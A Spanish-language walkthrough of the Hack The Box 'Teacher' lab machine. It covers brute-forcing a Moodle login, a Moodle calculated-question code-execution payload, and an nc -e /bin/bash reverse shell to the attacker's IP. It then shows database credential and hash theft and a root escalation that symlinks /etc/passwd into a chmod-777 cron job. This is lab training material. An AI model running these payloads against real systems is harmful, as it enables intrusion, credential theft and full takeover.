---
title: Hack The Box Teacher
author: k4miyo
date: 2021-10-11
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [PHP, SQL, File Misconfiguration]
ping: true
---

## Teacher
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.153.

```bash
❯ ping -c 1 10.10.10.153
PING 10.10.10.153 (10.10.10.153) 56(84) bytes of data.
64 bytes from 10.10.10.153: icmp_seq=1 ttl=63 time=137 ms

--- 10.10.10.153 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 137.274/137.274/137.274/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.153 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-11 17:58 CDT
Initiating Ping Scan at 17:58
Scanning 10.10.10.153 [4 ports]
Completed Ping Scan at 17:58, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:58
Scanning 10.10.10.153 [65535 ports]
Discovered open port 80/tcp on 10.10.10.153
SYN Stealth Scan Timing: About 47.21% done; ETC: 18:00 (0:00:35 remaining)
Completed SYN Stealth Scan at 17:59, 58.86s elapsed (65535 total ports)
Nmap scan report for 10.10.10.153
Host is up (0.24s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 59.18 seconds
           Raw packets sent: 65995 (2.904MB) | Rcvd: 65992 (2.640MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.153
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80 10.10.10.153 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-11 18:00 CDT
Nmap scan report for 10.10.10.153
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Blackhat highschool
|_http-server-header: Apache/2.4.25 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds
```

Antes de ver el sitio web, vamos a echarle un ojo con nuestra herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.153/
http://10.10.10.153/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[contact@blackhatuni.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.153], JQuery[1.11.1], Script, Title[Blackhat highschool]
```

Vemos una dirección de correo electrónico `contact@blackhatuni.com` y poco más de lo que ya nos había reportado `nmap`. Ahora si vamos a echarle un ojo:

![""](/assets/images/htb-teacher/teacher-web.png)

Analizando un poco la página, vemos que existe un recurso `gallery.html` en donde se tienen múltiples imágenes y checando el código fuente, vemos algo curioso para una *imagen*:

![""](/assets/images/htb-teacher/teacher-imagen.png)

```html
<li><a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
```

Al tratar de abrirla, no vemos la imagen asociada:

![""](/assets/images/htb-teacher/teacher-imagen1.png)

Vamos a descargarla a nuestra máquina y le echamos un ojo

```bash
❯ wget http://10.10.10.153/images/5.png
--2021-10-11 19:59:43--  http://10.10.10.153/images/5.png
Conectando con 10.10.10.153:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 200 [image/png]
Grabando a: «5.png»

5.png                            100%[=======================================================>]     200  --.-KB/s    en 0s      

2021-10-11 19:59:43 (12.9 MB/s) - «5.png» guardado [200/200]
❯ file 5.png
5.png: ASCII text
```

Resulta que le archivo `5.png` es un archivo de texto, así que vamos a hacerle un `¢at`:

```bash
❯ cat 5.png
───────┬──────────────────────────────────────────────────────────────────────────
       │ File: 5.png
───────┼──────────────────────────────────────────────────────────────────────────
   1   │ Hi Servicedesk,
   2   │ 
   3   │ I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
   4   │ 
   5   │ Could you guys figure out what the last charachter is, or just reset it?
   6   │ 
   7   │ Thanks,
   8   │ Giovanni
```

Tenemos un potencial usuario y una parte de una contraseña (Recordar que debemos de guardar dicha información); lo que implica que necesitamos encontrar un panel de login para poder acceder, así que vamos a tirar de `wfuzz`:

```bash
❯ wfuzz -c -t 100 --hc=404 --hw=747 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.153/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000016:   301        9 L      28 W       313 Ch      "images"                                                        
000000550:   301        9 L      28 W       310 Ch      "css"                                                           
000000730:   301        9 L      28 W       313 Ch      "manual"                                                        
000000953:   301        9 L      28 W       309 Ch      "js"                                                            
000001073:   301        9 L      28 W       317 Ch      "javascript"                                                    
000002771:   301        9 L      28 W       312 Ch      "fonts"                                                         
000010825:   403        11 L     32 W       297 Ch      "phpmyadmin"                                                    
000014433:   301        9 L      28 W       313 Ch      "moodle"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 22685
Filtered Requests: 22677
Requests/sec.: 0
```

Vemos un `phpmyadmin`; sin embargo, por el código de estado, 403, no tenemos permisos para acceder. Otro directorio que vemos es `moodle`, que investigando un poco, tenemos que **Moodle** es una herramienta de gestión de aprendizaje, o más concretamente de Learning Content Management, de distribución libre, escrita en PHP.

![""](/assets/images/htb-teacher/teacher-moodle.png)

Vemos que dicho recurso presenta un panel de login; por lo que ya debemos estar pensando en que el usuario podría ser **Giovanni** y la contraseña **Th4C00lTheacha** más un carácter que le falta; por lo tanto podríamos hacer un tipo de fuerza bruta añadiendo caracteres al final de la contraseña y mandando la solicitud. Vamos a crearnos un diccionario haciendo uso, primeramente, de los caracteres en ascii; por lo que vamos a ver su correspondiente a decimal:

```bash
❯ man ascii
ASCII(7)                                          Linux Programmer's Manual                                          ASCII(7)

NAME
       ascii - ASCII character set encoded in octal, decimal, and hexadecimal

DESCRIPTION
       ASCII  is  the  American  Standard Code for Information Interchange.  It is a 7-bit code.  Many 8-bit codes (e.g., ISO
       8859-1) contain ASCII as their lower half.  The international counterpart of ASCII is known as ISO 646-IRV.

       The following table contains the 128 ASCII characters.

       C program '\X' escapes are noted.

       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char
       ────────────────────────────────────────────────────────────────────────
       000   0     00    NUL '\0' (null character)   100   64    40    @
       001   1     01    SOH (start of heading)      101   65    41    A
       002   2     02    STX (start of text)         102   66    42    B
       003   3     03    ETX (end of text)           103   67    43    C
       004   4     04    EOT (end of transmission)   104   68    44    D
       005   5     05    ENQ (enquiry)               105   69    45    E
       006   6     06    ACK (acknowledge)           106   70    46    F
       007   7     07    BEL '\a' (bell)             107   71    47    G
       010   8     08    BS  '\b' (backspace)        110   72    48    H
       011   9     09    HT  '\t' (horizontal tab)   111   73    49    I
       012   10    0A    LF  '\n' (new line)         112   74    4A    J
       013   11    0B    VT  '\v' (vertical tab)     113   75    4B    K
       014   12    0C    FF  '\f' (form feed)        114   76    4C    L
       015   13    0D    CR  '\r' (carriage ret)     115   77    4D    M
       016   14    0E    SO  (shift out)             116   78    4E    N
       017   15    0F    SI  (shift in)              117   79    4F    O
       020   16    10    DLE (data link escape)      120   80    50    P
       021   17    11    DC1 (device control 1)      121   81    51    Q
       022   18    12    DC2 (device control 2)      122   82    52    R
       023   19    13    DC3 (device control 3)      123   83    53    S
       024   20    14    DC4 (device control 4)      124   84    54    T
       025   21    15    NAK (negative ack.)         125   85    55    U
       026   22    16    SYN (synchronous idle)      126   86    56    V
       027   23    17    ETB (end of trans. blk)     127   87    57    W
       030   24    18    CAN (cancel)                130   88    58    X
       031   25    19    EM  (end of medium)         131   89    59    Y
       032   26    1A    SUB (substitute)            132   90    5A    Z
       033   27    1B    ESC (escape)                133   91    5B    [
       034   28    1C    FS  (file separator)        134   92    5C    \  '\\'
       035   29    1D    GS  (group separator)       135   93    5D    ]
       036   30    1E    RS  (record separator)      136   94    5E    ^
       037   31    1F    US  (unit separator)        137   95    5F    _
       040   32    20    SPACE                       140   96    60    `
       041   33    21    !                           141   97    61    a
       042   34    22    "                           142   98    62    b
	   042   34    22    "                           142   98    62    b
       043   35    23    #                           143   99    63    c
       044   36    24    $                           144   100   64    d
       045   37    25    %                           145   101   65    e
       046   38    26    &                           146   102   66    f
       047   39    27    '                           147   103   67    g
       050   40    28    (                           150   104   68    h
       051   41    29    )                           151   105   69    i
       052   42    2A    *                           152   106   6A    j
       053   43    2B    +                           153   107   6B    k
       054   44    2C    ,                           154   108   6C    l
       055   45    2D    -                           155   109   6D    m
       056   46    2E    .                           156   110   6E    n
       057   47    2F    /                           157   111   6F    o

       060   48    30    0                           160   112   70    p
       061   49    31    1                           161   113   71    q
       062   50    32    2                           162   114   72    r
       063   51    33    3                           163   115   73    s
       064   52    34    4                           164   116   74    t
       065   53    35    5                           165   117   75    u
       066   54    36    6                           166   118   76    v
       067   55    37    7                           167   119   77    w
       070   56    38    8                           170   120   78    x
       071   57    39    9                           171   121   79    y
       072   58    3A    :                           172   122   7A    z
       073   59    3B    ;                           173   123   7B    {
       074   60    3C    <                           174   124   7C    |
       075   61    3D    =                           175   125   7D    }
       076   62    3E    >                           176   126   7E    ~
       077   63    3F    ?                           177   127   7F    DEL
```

Tenemos que los caracteres que nos interesan parten del 33 `!` hasta el 126 `~`. Una vez definido esto, vamos a crearnos un programita en python que nos cree el diccionario:

```python
#!/usr/bin/python3

if __name__ == '__main__':
    f = open('dictionary.txt','w')
    for i in range(33, 126):
        f.write("Th4C00lTheacha{}\n".format(chr(i)))
    f.close()
```

Al ejecutarlo, nos genera el archivo `dictionary.txt` con las posibles contraseñas del usuario **Giovanni**, ahora necesitamos realizar las peticiones hacia el servidor.

```bash
❯ wfuzz -c -L --hw=1224 -w dictionary.txt -d "username=Giovanni&password=FUZZ" http://10.10.10.153/moodle/login/index.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/moodle/login/index.php
Total requests: 93

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000003:   200        296 L    1257 W     27569 Ch    "Th4C00lTheacha#"                                               

Total time: 11.02567
Processed Requests: 93
Filtered Requests: 92
Requests/sec.: 8.434860
```

Vemos que la contraseña es `Th4C00lTheacha#` y vamos a tratar de ingresar al panel de login.

![""](/assets/images/htb-teacher/teacher-giovanni.png)

Estamos dentro, ahora necesitamos buscar una forma de ejecutar comandos a nivel de sistema, así que buscando *moodle remote code executioin* nos parace el siguiente recurso:

[sonarsource](https://blog.sonarsource.com/moodle-remote-code-execution)

En dicho sitio web, nos indica básicamente que debemos ingresar al curso; que para nuestro caso sería en **Site home** ubicando del lado izquierdo y posteriormente a **Algebra**. Ahora le damos en el engrane y en la opción **Turn editting on** y nos parecen varias opciones:

![""](/assets/images/htb-teacher/teacher-editting.png)

Posteriormente, le damos click a la opción **Add an activity or resource** ubicada del lado derecho y escogemos la opción **Quiz**.

![""](/assets/images/htb-teacher/teacher-quiz.png)

Le damos en **Add** y nos solicitará llenar algunos campos:

- General
	- Name: Lo que sea
	- Description: Lo que sea también

Hasta abajo le damos click en **Save and display**

![""](/assets/images/htb-teacher/teacher-question.png)

Ahora le damos click en **Edit quiz** y en la parte donde dice **Suffle**, hacemos click en **Add** y luego **a new question**.

![""](/assets/images/htb-teacher/teacher-question1.png)

Escogemos la opción **Calculated** y en el formulario que nos aparece, llenamos los campos:

- General
	-  Question name: Lo que sea otra vez
	-   Question text: Más de lo que sea
- Answer
	- Answer 1 formula = /*{a*/\`$_GET[0]\`;//{x}}
	- Grade: 100%

Vamos hasta el final y le damos **Save changes**.

![""](/assets/images/htb-teacher/teacher-rce.png)

Ahora le damos click en donde dice **Next page** y vemos que en la URL nos parece algo así:

 - http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7

De acuerdo con el valor del campo **Answer 1 formula =**, estamos parametrizando la variable **0**. Si ponemos al final de la URL *&0=whoami* no nos va a resultar debido a que no tenemos donde visualizar el resultado del comando; así que nos vamos a tirar un `ping` a nuestra máquina de atacante y nos ponemos en escucha en nuestra interfaz con `tcpdump`, por lo que la uri quedaría:

 - http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=ping%20-c%201%2010.10.14.24

```bash
❯ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:32:04.402092 IP 10.10.10.153 > 10.10.14.24: ICMP echo request, id 3559, seq 1, length 64
21:32:04.402199 IP 10.10.14.24 > 10.10.10.153: ICMP echo reply, id 3559, seq 1, length 64
21:32:04.545135 IP 10.10.10.153 > 10.10.14.24: ICMP echo request, id 3561, seq 1, length 64
21:32:04.545169 IP 10.10.14.24 > 10.10.10.153: ICMP echo reply, id 3561, seq 1, length 64
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel
```

Vemos que hemos recibido una traza icmp de la dirección IP 10.10.10.153, que es la máquina víctima; así que ahora vamos a tratar de entablarnos una reverse shell, nos ponemos en escucha por el puerto 443:

 - http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=nc%20-e%20%22/bin/bash%22%2010.10.14.24%20443

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.153] 46242
whoami
www-data
```

Hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos. Una vez hecho, nos encontramos dentro de la máquina como el usuario `www-data` y no podemos visualizar la flag dentro del directorio `/home/giovanni`; asi que vamos a buscar una forma de escalar privilegios enumerando un poco el sistema:

```bash
www-data@teacher:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@teacher:/home$ sudo -l
bash: sudo: command not found
www-data@teacher:/home$ cd /
www-data@teacher:/$ find \-perm -4000 2>/dev/null
./bin/ping
./bin/su
./bin/fusermount
./bin/umount
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/passwd
www-data@teacher:/$
```

No vemos nada interesante, así que vamos al recurso `/var/www/html/moodle` para ver si existe algo que podamos utilizar:

```bash
www-data@teacher:/var/www/html/moodle$ find \-name *config.php 2>/dev/null
./cache/classes/config.php
./lib/editor/tinymce/plugins/spellchecker/config.php
./config.php
./mod/chat/gui_ajax/theme/course_theme/config.php
./mod/chat/gui_ajax/theme/bubble/config.php
./mod/chat/gui_ajax/theme/compact/config.php
./theme/more/config.php
./theme/clean/config.php
./theme/bootstrapbase/config.php
./theme/boost/config.php
www-data@teacher:/var/www/html/moodle$
```

Tenemos varios archivos, así que vamos a echarles un ojo y buscar concretamente por la palabra `pass` o `password`:

```bash
www-data@teacher:/var/www/html/moodle$ find \-name *config.php 2>/dev/null | xargs cat | less
...
$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);
...
```

Tenemos los datos de acceso a la base de datos, por lo que podriamos entrar y buscar que una tabla que contenga información que nos pueda ayudar a migrar a un usuario del sistema:

```bash
www-data@teacher:/var/www/html/moodle$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 574
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.00 sec)

MariaDB [(none)]>
MariaDB [moodle]> select table_name from information_schema.tables where table_schema = 'moodle' and table_name like '%user%';
+---------------------------------+
| table_name                      |
+---------------------------------+
| mdl_assign_user_flags           |
| mdl_assign_user_mapping         |
| mdl_chat_users                  |
| mdl_competency_usercomp         |
| mdl_competency_usercompcourse   |
| mdl_competency_usercompplan     |
| mdl_competency_userevidence     |
| mdl_competency_userevidencecomp |
| mdl_enrol_lti_lti2_user_result  |
| mdl_enrol_lti_users             |
| mdl_external_services_users     |
| mdl_oauth2_user_field_mapping   |
| mdl_portfolio_instance_user     |
| mdl_stats_user_daily            |
| mdl_stats_user_monthly          |
| mdl_stats_user_weekly           |
| mdl_tool_usertours_steps        |
| mdl_tool_usertours_tours        |
| mdl_user                        |
| mdl_user_devices                |
| mdl_user_enrolments             |
| mdl_user_info_category          |
| mdl_user_info_data              |
| mdl_user_info_field             |
| mdl_user_lastaccess             |
| mdl_user_password_history       |
| mdl_user_password_resets        |
| mdl_user_preferences            |
| mdl_user_private_key            |
+---------------------------------+
29 rows in set (0.00 sec)

MariaDB [moodle]> 
```

Aqui vemos la tabla `mdl_user` de la base de datos `moodle`:

```bash
MariaDB [moodle]> describe mdl_user;                                                                                             
+-------------------+--------------+------+-----+-----------+----------------+                                                   
| Field             | Type         | Null | Key | Default   | Extra          |                                                   
+-------------------+--------------+------+-----+-----------+----------------+                                                   
| id                | bigint(10)   | NO   | PRI | NULL      | auto_increment |                                                   
| auth              | varchar(20)  | NO   | MUL | manual    |                |                                                   
| confirmed         | tinyint(1)   | NO   | MUL | 0         |                |                                                   
| policyagreed      | tinyint(1)   | NO   |     | 0         |                |                                                   
| deleted           | tinyint(1)   | NO   | MUL | 0         |                |                                                   
| suspended         | tinyint(1)   | NO   |     | 0         |                |                                                   
| mnethostid        | bigint(10)   | NO   | MUL | 0         |                |                                                   
| username          | varchar(100) | NO   |     |           |                |
| password          | varchar(255) | NO   |     |           |                |
| idnumber          | varchar(255) | NO   | MUL |           |                |
| firstname         | varchar(100) | NO   | MUL |           |                |
| lastname          | varchar(100) | NO   | MUL |           |                |
...
```

Selecionamos los campos que nos interesan como `username` y `password`:

```bash
MariaDB [moodle]> select username,password from mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)

MariaDB [moodle]>
```

Notamos de entrada que para el usuario `Giovannibak` se tiene un hash diferente a los demás usuarios; así que vamos a validar a que nos enfrentamos:

```bash
❯ hash-identifier                                                                                                                
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 7a860966115182402ed06375cf0a22af
                                
Possible Hashs:                                                                                                                  
[+] MD5                                                         
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Nos indica que es MD5, así que podríamos tratar de romperla con la herramienta `john` o con herramientas online como [crackstation](https://crackstation.net/):

![""](/assets/images/htb-teacher/teacher-crack.png)

Podríamos utilizar la contraseña para migrar al usuario `giovanni`:

```bash
www-data@teacher:/var/www/html/moodle$ su giovanni
Password: 
giovanni@teacher:/var/www/html/moodle$ whoami
giovanni
giovanni@teacher:/var/www/html/moodle$
```

Ahora si ya podemos visualizar la flag (user.txt) y nos queda escalar privilegios.

```bash
giovanni@teacher:~$ id
uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
giovanni@teacher:~$ sudo -l
bash: sudo: command not found
giovanni@teacher:~$ cd /
giovanni@teacher:/$ find \-perm -4000 2>/dev/null
./bin/ping
./bin/su
./bin/fusermount
./bin/umount
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/passwd
giovanni@teacher:/$ 
```

Vamos a checar si existen tareas que se estén ejecutando en el sistema a intervalos regulares y vamos a utilizar nuestro archivo [ProcMon](/posts/procmon):

```bash
giovanni@teacher:/$ cd /dev/shm
giovanni@teacher:/dev/shm$ touch procmon.sh
giovanni@teacher:/dev/shm$ chmod +x procmon.sh 
giovanni@teacher:/dev/shm$ 
```

Lo ejecutamos y esperamos un rato:

```bash
giovanni@teacher:/dev/shm$ ./procmon.sh 
> /usr/sbin/cron -f
> /usr/sbin/CRON -f
> /bin/sh -c /usr/bin/backup.sh
> /bin/bash /usr/bin/backup.sh
> tar -czvf tmp/backup_courses.tar.gz courses/algebra
< /usr/sbin/cron -f
> /bin/sh -c gzip
< /usr/sbin/CRON -f
< /bin/sh -c /usr/bin/backup.sh
< /bin/bash /usr/bin/backup.sh
< tar -czvf tmp/backup_courses.tar.gz courses/algebra
< /bin/sh -c gzip

```

Vemos que se está ejecutando el script `/usr/bin/backup.sh`, asi que vamos a echarle un ojo a ver que hace:

```bash
giovanni@teacher:/dev/shm$ cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
giovanni@teacher:/dev/shm$
```

El script ingresa al directorio `cd /home/giovanni/work`, comprime con el comando `tar` lo que está en `courses/*` y lo guarda en `tmp/`; posterior ingresa a `tmp/` y descomprime lo que hay en el archivo `backup_courses.tar.gz` y por último asigna permisos 777 de forma recursiva a todo lo que se encuentra en `tmp/`.

Por lo que podríamos aprovechar para hacer un link simbólico de un archivo dentro de `tmp/` para que el usuario que ejecuta el script, en este caso **root** asigne los permisos 777.

```bash
giovanni@teacher:~/work/tmp$ ln -s -f /etc/passwd passwd
giovanni@teacher:~/work/tmp$ ls -l
total 8
-rwxrwxrwx 1 root     root      256 Oct 12 05:54 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4096 Jun 27  2018 courses
lrwxrwxrwx 1 giovanni giovanni   11 Oct 12 05:54 passwd -> /etc/passwd
giovanni@teacher:~/work/tmp$
```

Validamos que el archivo `/etc/passwd` tenga los permisos 777.

```bash
giovanni@teacher:~/work/tmp$ ls -l /etc/passwd
-rw-r--r-- 1 root root 1450 Jun 27  2018 /etc/passwd
giovanni@teacher:~/work/tmp$ ls -l /etc/passwd
-rwxrwxrwx 1 root root 1450 Jun 27  2018 /etc/passwd
giovanni@teacher:~/work/tmp$ 
```

Ahora vamos a generar la contraseña `hola` con la herramienta `openssl`:

```bash
giovanni@teacher:~/work/tmp$ openssl passwd
Password: 
Verifying - Password: 
c6FsdpoXH4yFk
giovanni@teacher:~/work/tmp$
```

El resultado lo sustituimos en el archivo `/etc/passwd` para el usuario **root**:

```bash
giovanni@teacher:~/work/tmp$ cat /etc/passwd
root:c6FsdpoXH4yFk:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
giovanni:x:1000:1000:Giovanni,1337,,:/home/giovanni:/bin/bash
giovanni@teacher:~/work/tmp$
```

Ahora podemos migrar al usuario **root** con contraseña `hola`:

```bash
giovanni@teacher:~/work/tmp$ su root
Password: 
root@teacher:/home/giovanni/work/tmp# whoami
root
root@teacher:/home/giovanni/work/tmp#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
